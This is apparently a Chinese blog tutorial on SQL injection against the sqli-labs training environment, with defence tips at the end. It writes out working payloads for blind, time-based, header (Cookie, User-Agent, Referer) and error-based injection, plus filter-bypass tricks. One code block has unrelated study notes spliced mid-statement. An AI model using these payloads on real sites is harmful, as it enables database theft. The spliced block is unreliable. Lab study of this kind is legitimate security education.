1：LESS-11</h3><blockquote><p><code>http://192.168.1.100/sqli-labs/Less-11/</code></p></blockquote><p>BP 抓包</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121635294.png" alt="image-20221112163502523" style="zoom:50%;" /><p>我们把抓的包发送到 Repeater 后，进行改包：<br>password 的参数加一个<code>’</code>进行提交：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121635591.png" alt="image-20221112163526987" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;You have an error in your SQL syntax; check the</span><br><span class="line">manual that corresponds to your MySQL server version for the right syntax to use near</span><br><span class="line">&#x27;&#x27;admin&#x27;&#x27; LIMIT 0,1&#x27; at line 1&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/font&gt;</span><br></pre></td></tr></table></figure><p>分析可以得出，当前位置是用单引号进行闭合的。</p><p>我们知道了是单引号闭合，接下来我们构造语句进行绕过：<br><code>uname=admin&amp;passwd=admin&#39; or 1=1 --+&amp;submit=Submit</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121636285.png" alt="image-20221112163630663" style="zoom:50%;" /><p>右击鼠标，选择 <code>request in browser---&gt;in current browser session---&gt;copy</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121637145.png" alt="image-20221112163709671" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121637859.png" alt="image-20221112163725347" style="zoom:50%;" /><p>浏览器里面输入连接：<code>http://burp/repeat/3/tq2i0zjd3te1hf0r0vmuf6n5zo8aponc</code>，登录成功；</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121637989.png" alt="image-20221112163750394" style="zoom:50%;" /><h2 id="POST盲注"><a href="#POST盲注" class="headerlink" title="POST盲注"></a>POST盲注</h2><p>跟GET盲注差别不大，注入流程及方法是一样的</p><blockquote><p>实验：<a href="http://hetianlab.com/expc.do?ec=ECID172.19.104.182014081415203100001">http://hetianlab.com/expc.do?ec=ECID172.19.104.182014081415203100001</a></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">判断：</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=2 #</span></span><br><span class="line"><span class="string">获取当前数据库长度： 1&#x27;</span> <span class="keyword">or</span> length(database())<span class="operator">=</span><span class="number">8</span>  #</span><br><span class="line">获取当前数据库版本： <span class="number">1</span><span class="string">&#x27; or left(version(),6)=&#x27;</span><span class="number">5.5</span><span class="number">.53</span><span class="string">&#x27; #</span></span><br><span class="line"><span class="string">获取当前数据库名：</span></span><br><span class="line"><span class="string">当前数据库第一个字符： 1&#x27;</span> <span class="keyword">or</span> ORD(mid(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span> #    s</span><br><span class="line">（  ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>   #）</span><br><span class="line">（  <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span>‘s’   ）</span><br><span class="line">当前数据库第二个字符： <span class="number">1</span><span class="string">&#x27; or ORD(mid(database(),2,1))=101 #       </span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string">（  ascii(substr(database(),2,1))=115   #）</span></span><br><span class="line"><span class="string">（  left(database(),2)=‘se’   #）</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string">得到当前数据库名：security</span></span><br></pre></td></tr></table></figure><h3 id="例-2：LESS-15"><a href="#例-2：LESS-15" class="headerlink" title="例 2：LESS-15"></a>例 2：LESS-15</h3><p>用基于布尔的盲注来测试：</p><p>下面我们开始截断数据包进行 SQL 注入操作；<br>浏览器访问 <code>http://192.168.1.00/sqli-labs/Less-15/</code><br>在页面输入用户名及密码，并提交：</p><p>bp 抓包：</p><p>Ctrl+R 发送到 Repeater 改包：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121639223.png" alt="image-20221112163928671" style="zoom:50%;" /><p>设计 SQL 语句，带如参数,进行执行：<br><code>uname=admin&#39; and (length(database())=8)--+&amp;passwd=admin&amp;submit=Submita</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121640704.png" alt="image-20221112164023219" style="zoom:50%;" /><p>成功返回 flag.jpg 失败则返回 slap.jpg;<br>其它关于爆库爆表等操作和前面 GET 注入方式相同，这里不再做演示。</p><h3 id="例-3：LESS-16"><a href="#例-3：LESS-16" class="headerlink" title="例 3：LESS-16"></a>例 3：LESS-16</h3><p>用基于时间的盲注来测试：</p><p>下面我们开始截断数据包进行 SQL 注入操作；<br>浏览器访问 <a href="http://192.168.1.0/sqli-labs/Less-16/">http://192.168.1.00/sqli-labs/Less-16/</a><br>在页面输入用户名及密码，并提交</p><p>bp 抓包：</p><p>ctrl+r，发送到 repeater 改包；<br>代码分析下闭合符号：发现闭合需要双引号括号；</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121641432.png" alt="image-20221112164127908"></p><p>设计 SQL 语句，带如参数,进行执行：<br>这个是基于布尔的盲注：<br><code>uname=admin&quot;) and (length(database())=8)--+&amp;passwd=admin&amp;submit=Submit</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121641827.png" alt="image-20221112164150196" style="zoom:50%;" /><p>再看一下基于时间的盲注：<br><code>uname=admin&quot;) and if(length(database())=8,sleep(3),null)--+&amp;passwd=admin&amp;submit=Submit</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121642930.png" alt="image-20221112164223202" style="zoom:50%;" /><p>根据右下角的页面响应时间来进行判断条件是否满足。</p><p>if 判断语句解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(length(database())&gt;1,sleep(3),null))#条件成功则睡眠 3 秒，否则直接返回</span><br><span class="line">length(database())&gt;1#判断条件</span><br><span class="line">sleep(3)#当条件成功时，则执行的内容</span><br><span class="line">null#当条件不成功时执行的内容</span><br></pre></td></tr></table></figure><h2 id="头部注入"><a href="#头部注入" class="headerlink" title="头部注入"></a>头部注入</h2><h3 id="cookie-注入"><a href="#cookie-注入" class="headerlink" title="cookie 注入"></a>cookie 注入</h3><h4 id="Cookie-介绍："><a href="#Cookie-介绍：" class="headerlink" title="Cookie 介绍："></a>Cookie 介绍：</h4><p>用户访问网站在交互的过程中，用户的一系列操作肯定会产生一些数据需要保存。这时就需要使用Cookie 或者 Session 技术来完成。</p><h4 id="Cookie-的应用场景："><a href="#Cookie-的应用场景：" class="headerlink" title="Cookie 的应用场景："></a>Cookie 的应用场景：</h4><p>我们登录网站时如果选择记住密码，浏览器就会保存我们登录网站的 cookie，我们下次打开网站时就不需要再次输入用户名密码等信息。<br>因为 Cookie 为我们带来了非常多的便捷性，但是也给我们带来了非常多的安全隐患，比如攻击者可以窃取用户的 Cookie 来获得用户权限，或者攻击者修改 Cookie 对目标服务器进行攻击。</p><blockquote><p>LESS-20: <a href="http://192.168.1.100/sqli-labs/Less-20/">http://192.168.1.100/sqli-labs/Less-20/</a></p></blockquote><p>抓包：Forward 放行一下</p><p>继续抓包：抓 cookie 包；<br>注：不同的浏览器抓的 cookie 不一样，这个不影响我们注入；</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121647382.png" alt="image-20221112164713691" style="zoom:50%;" /><p>ctrl+R,发送到 repeater 进行改包</p><p>设计 SQL 语句，带如参数,进行执行：<br>观察发现是单引号闭合；</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121647548.png" alt="image-20221112164746856" style="zoom:50%;" /><p>使用 updatexml 报错注入获取数据库名称<br><code>Cookie: uname=admin&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) or &#39;1&#39;=&#39;1</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121648874.png" alt="image-20221112164815184" style="zoom:50%;" /><h3 id="User-Agent-注入"><a href="#User-Agent-注入" class="headerlink" title="User-Agent 注入"></a>User-Agent 注入</h3><blockquote><p>LESS-18: <a href="http://192.168.1.100/sqli-labs/Less-18/">http://192.168.1.100/sqli-labs/Less-18/</a></p></blockquote><p>抓包：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121649007.png" alt="image-20221112164939308" style="zoom:50%;" /><p>ctrl+r,发送到 repeater，进行改包：</p><p>设计 SQL 语句，带如参数,进行执行：<br>观察发现是单引号闭合；</p><p>使用 updatexml 报错注入获取数据库版本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121650788.png" alt="image-20221112165054259" style="zoom:50%;" /><h3 id="Referer-注入："><a href="#Referer-注入：" class="headerlink" title="Referer 注入："></a>Referer 注入：</h3><blockquote><p>LESS-19: <a href="http://192.168.1.100/sqli-labs/Less-19/">http://192.168.1.100/sqli-labs/Less-19/</a></p></blockquote><p>抓包：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121651558.png" alt="image-20221112165133791" style="zoom:50%;" /><p>ctrl+r,发送到 repeater，进行改包：</p><p>设计 SQL 语句，带如参数,进行执行：<br>观察发现是单引号闭合；</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121651386.png" alt="image-20221112165158706" style="zoom:50%;" /><p>使用 updatexml 报错注入获取数据库名称：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer: http://192.168.1.100/sqli-labs/Less-19/&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121652614.png" alt="image-20221112165228874" style="zoom:50%;" /><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">通过函数报错获取信息：（报错信息会有长度限制）</span><br><span class="line">使用一些指定的函数来制造报错信息，从而获取报错信息中特定的信息</span><br><span class="line">当其发生错误的时候呢，xpath语法报错会提示你在哪里发生了什么错误，会执行相应<span class="keyword">sql</span>语句</span><br><span class="line">所以我们会根据xpath的报错提取出自己想要的信息</span><br><span class="line">前提：</span><br><span class="line">后台没有屏蔽数据库报错信息，发生错误时会输出错误信息在前端页面</span><br><span class="line">常用的报错函数：</span><br><span class="line">updatexml()、extractvalue()、floor</span><br><span class="line">使用函数报错获取信息：</span><br><span class="line"><span class="keyword">select</span>、<span class="keyword">insert</span>、<span class="keyword">update</span>、<span class="keyword">delete</span></span><br></pre></td></tr></table></figure><h3 id="updatexml-函数、extractvalue-函数"><a href="#updatexml-函数、extractvalue-函数" class="headerlink" title="updatexml()函数、extractvalue()函数"></a>updatexml()函数、extractvalue()函数</h3><blockquote><ul><li>介绍：是mysql对xml文档数据进行查询和修改的XPATH函数</li><li>作用：改变（查找并替换）xml文档中符合条件的节点的值</li><li>语法：</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">updatexml(xml_document,xpath_string,new_value)</span><br><span class="line"></span><br><span class="line">extractvalue(xml_document,xpath_string)</span><br></pre></td></tr></table></figure><ul><li>参数：</li></ul><blockquote><ul><li>xml_document：string格式，xml文档对象的名称</li><li>xpath_string：xpath格式的字符串</li><li>new_value：string格式，替换查找到的符合条件的值</li></ul></blockquote><ul><li>注意:</li></ul><blockquote><ul><li>Xpath定位必须有效，否则会有错误————我们想让其报错的当让就是要使其xpath定位无效</li><li>xpath_string的xml语法必须有效 否则就会报错——所以可以利用</li></ul></blockquote></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span>获取信息</span><br><span class="line">#updatexml()函数：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,credis未授权      <span class="number">12.00</span><span class="number">-22.49</span>    需要挺 上节没讲完的，</span><br><span class="line">redis未授权听完</span><br><span class="line">docker未授权听完</span><br><span class="line">Apache Log4j2漏洞        听完</span><br><span class="line"></span><br><span class="line">听到文件上传</span><br><span class="line">oncat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br><span class="line">#<span class="number">0x7e</span>：<span class="operator">~</span>的ascii码</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>‘security’ limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">#extractvalue()函数：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))));</span><br></pre></td></tr></table></figure><h3 id="floor-函数"><a href="#floor-函数" class="headerlink" title="floor()函数"></a>floor()函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql用于取整数的函数</span><br><span class="line">floor报错函数，以下三个缺一不可</span><br><span class="line">rand()：结果不可以作为order by、group by的条件字段.</span><br><span class="line">rand() : 产生一个介于0-1之间的floa随机数。rand(0)产生一个固定的随机数。rand(0)*2产生一个介于0-2之间的固定的随机数。</span><br><span class="line">count(*)：计算所有行数，不忽略空值（null）</span><br><span class="line">group by：根据字段分组</span><br><span class="line">例子：</span><br><span class="line">select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">floor报错产生的条件： (自定义数据库的一张表)</span><br><span class="line">select count(*) ,floor(rand(0)*2)x from security.users group by x;</span><br><span class="line">x是floor(rand(0)*2)的别名</span><br><span class="line">报错结果entry后面的值1是根据mysql报错原理决定</span><br><span class="line">报错位置是在floor(rand(0)*2)</span><br><span class="line">思路：</span><br><span class="line">在报错位置处，用concat()拼接我们想要的语句，产生报错即可输出我们想要的结果。</span><br><span class="line">过程分析：</span><br><span class="line">首先我们来看下这个sql查询语句：</span><br><span class="line">select &#x27;a&#x27;,concat(1,floor(rand(0)*2))x from security.users group by x;</span><br><span class="line">加上查询数据库的语句：</span><br><span class="line">select &#x27;a&#x27;,concat(database(),floor(rand(0)*2))x from security.users group by x;</span><br><span class="line">select count(*),concat(database(),floor(rand(0)*2))x from security.users group by x;</span><br><span class="line">select count(*),concat(database(),floor(rand(0)*2))x from information_schema.schemata group by x;</span><br><span class="line">Operand should contain 1 column(s)报错</span><br><span class="line">因为这里select语句构建的是一个结果表，而and比较是需要一个布尔值，0或非零的值。</span><br><span class="line">因此我们可以嵌套一个基于前面结果表的一个select查询语句，而这个select的值是非零数字：</span><br><span class="line">select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.schemata group by x)a;</span><br></pre></td></tr></table></figure><h3 id="十大报错注入函数"><a href="#十大报错注入函数" class="headerlink" title="十大报错注入函数"></a>十大报错注入函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select </span><br><span class="line">count(*),concat(user(),floor(rand(0)*2))x from </span><br><span class="line">information_schema.tables group by x)a);</span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,</span><br><span class="line">(select user()),0x7e),1));</span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select </span><br><span class="line">* from(select * from(select user())a)b));</span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * </span><br><span class="line">from(select * from(select user())a)b));</span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * </span><br><span class="line">from(select * from(select user())a)b));</span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * </span><br><span class="line">from(select * from(select user())a)b));</span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * </span><br><span class="line">from(select * from(select user())a)b));</span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * </span><br><span class="line">from(select * from(select user())a)b));</span><br><span class="line">10.exp()整形溢出报错</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select </span><br><span class="line">user())a));</span><br></pre></td></tr></table></figure><h3 id="exp-整形溢出报错"><a href="#exp-整形溢出报错" class="headerlink" title="exp()整形溢出报错"></a>exp()整形溢出报错</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071227701.png" alt="image-20221007122742697" style="zoom:50%;" /><h1 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h1><blockquote><p>mysql的话还好绕过安全狗或者其他的设备，但是若是其他数据库可能就不太好绕过了，即使绕过了也不好执行</p></blockquote><h2 id="注入函数被过滤，sql注入Bypass"><a href="#注入函数被过滤，sql注入Bypass" class="headerlink" title="注入函数被过滤，sql注入Bypass"></a>注入函数被过滤，sql注入Bypass</h2><blockquote><ul><li><strong>过滤了asci()，用hex(),bin(),ord()代替</strong></li><li><strong>过滤了等号，用in(),like代替</strong></li><li><strong>等效函数：</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep() ，benchmark(5000000,select1)，GET_LOCK</span><br><span class="line"></span><br><span class="line">concat_ws()  group_concat()</span><br><span class="line">@@user user()</span><br><span class="line">@@datadir datadir()</span><br></pre></td></tr></table></figure><ul><li><strong>过滤了substr()函数：</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用left(str,index),rigth(str,index),substring(str,index),</span><br><span class="line">mid(str,index,len)截取str，从index开始截取长度len，</span><br><span class="line">lpad(str,len,padstr)</span><br><span class="line">rpad(str,len,padstr)在str的左右两边填充给定的padstr到指定的长度len，返回填充结果</span><br></pre></td></tr></table></figure></blockquote><h2 id="空格："><a href="#空格：" class="headerlink" title="空格："></a>空格：</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">括号绕过：<span class="keyword">select</span>(password)<span class="keyword">from</span>(users);</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>a等字符替代绕过：<span class="operator">%</span><span class="number">00</span>，<span class="operator">%</span><span class="number">09</span>，<span class="operator">%</span><span class="number">0</span>a，<span class="operator">%</span><span class="number">0</span>b，<span class="operator">%</span><span class="number">0</span>c，<span class="operator">%</span><span class="number">0</span>d，<span class="operator">%</span><span class="number">20</span>，<span class="operator">%</span><span class="number">2</span>b……</span><br><span class="line">(内联)注释替代绕过：<span class="comment">/**/</span>，<span class="operator">/</span><span class="operator">!</span><span class="operator">*</span><span class="operator">*</span><span class="operator">/</span></span><br></pre></td></tr></table></figure><h2 id="逗号："><a href="#逗号：" class="headerlink" title="逗号："></a>逗号：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from for：substr(&#x27;asdzxcqwe&#x27; from 1 for 2);</span><br><span class="line">​join：union select * from (select 1)a join (select 2)b join (select 3)c</span><br><span class="line">​offset：limit 1 offset 0</span><br></pre></td></tr></table></figure><h2 id="单引号："><a href="#单引号：" class="headerlink" title="单引号："></a>单引号：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex编码：SELECT password FROM Users WHERE username = 0x61646D696E‘roothex编码</span><br><span class="line">char编码：SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</span><br><span class="line">%2527：`magic_quotes_gpc`开启可用</span><br></pre></td></tr></table></figure><h2 id="比较符号："><a href="#比较符号：" class="headerlink" title="比较符号："></a>比较符号：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">等于：=、like、regexp、rlike（默认不匹配大小写，需添加关键字binary）</span><br><span class="line">​不等于：!=、&lt;&gt;`</span><br><span class="line">​大小于：greatest()、least()</span><br><span class="line">select greatest(ord(&#x27;a&#x27;),0)=97;</span><br><span class="line">select ord(&#x27;a&#x27;) between 0 and 97</span><br><span class="line">select (ord(substr(&#x27;asd&#x27;from 1 for 1)) in (97))</span><br><span class="line"></span><br><span class="line">Offset（） https://blog.csdn.net/u012927188/article/details/41957879</span><br><span class="line">Ord() http://www.manongjc.com/article/885.html</span><br></pre></td></tr></table></figure><h2 id="注释符："><a href="#注释符：" class="headerlink" title="注释符："></a>注释符：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- -、%23、;%00、构造合法语句</span><br></pre></td></tr></table></figure><h1 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h1><blockquote><ol><li><p>严格限制网站访问数据库的权限。</p></li><li><p>数据类型进行严格定义，数据长度进行严格规定。<br>比如查询数据库某条记录的id，定义它为整型（强制类型转换），如果用户传来的数据不满足条件，要对数据进行过滤。数据长度也应该做严格限制，可以防止较长的SQL注入语句。</p></li><li><p>对用户输入进转义过滤<br>例如通过转义将’转义为&#39;</p></li><li><p>基于攻击特征的匹配过滤<br>黑名单白名单</p></li><li><p>采用sql语句预编译order by &#x2F; limit<br>先将查询语句固定 通过函数将传参变为字符串 拼接字符串去执行 你的关键字根本不会当作关键字去执行</p></li><li><p>对参数进行了AES加密（或者其他处理），为了防止参数产生SQL注入，也是防止SQL注入产生的一种方法</p></li></ol></blockquote><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="关于不同版本mysql注入"><a href="#关于不同版本mysql注入" class="headerlink" title="关于不同版本mysql注入"></a>关于不同版本mysql注入</h2><p>低版本mysql没有information_schema数据库，所以只能使用暴力查询和联合查询进行注入</p><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://blog.csdn.net/wangyuxiang946/article/details/122996953">SQL注入分类，一看你就明白了。SQL注入点&#x2F;SQL注入类型&#x2F;SQL注入有几种&#x2F;SQL注入点分类</a></li><li>[SQL注入 (1) SQL注入类型介绍 - xuthus5 - 博客园 (cnblogs.com)](<a href="https://www.cnblogs.com/xuthus/p/9450805.html#:~:text=sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B">https://www.cnblogs.com/xuthus/p/9450805.html#:~:text=sql注入类型</a> 1 （1）数字型注入点 2 （2）字符型注入点 3 （3）搜索型注入点 4,10 （3）基于报错注入 11 （4）联合查询注入 12 （5）堆查询注入 13 （6）宽字节注入)</li><li><a href="https://11pmsleep.github.io/2022-10-05-WEB%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/0x06-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">搭建sqli-labs靶场</a></li><li><a href="https://blog.csdn.net/weixin_39711867/article/details/111097353">sql截取字段的部分数据_这可能是最全的SQL注入总结，很有用</a></li><li><a href="https://www.cnblogs.com/csnd/p/11807596.html">https://www.cnblogs.com/csnd/p/11807596.html</a></li><li><a href="https://www.hetianlab.com/cour.do?w=1&c=C172.19.104.182014081415242400001">课程:SQL注入初级(合天网安实验室) (hetianlab.com)</a></li><li><a href="http://qiniu.gungnir.top/publicfile/mysql-injection.pdf">SQLi-LABS解析<code>mysql-injection.pdf</code>已上传云</a></li><li><a href="https://blog.csdn.net/weixin_42277564/article/details/94401484">SQL注入-搜索型输入</a></li><li><a href="https://blog.csdn.net/lay_loge/article/details/90445180">(3条消息) SQL注入及其危害、防御手段_lay_loge的博客-CSDN博客_sql注入的危害</a></li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
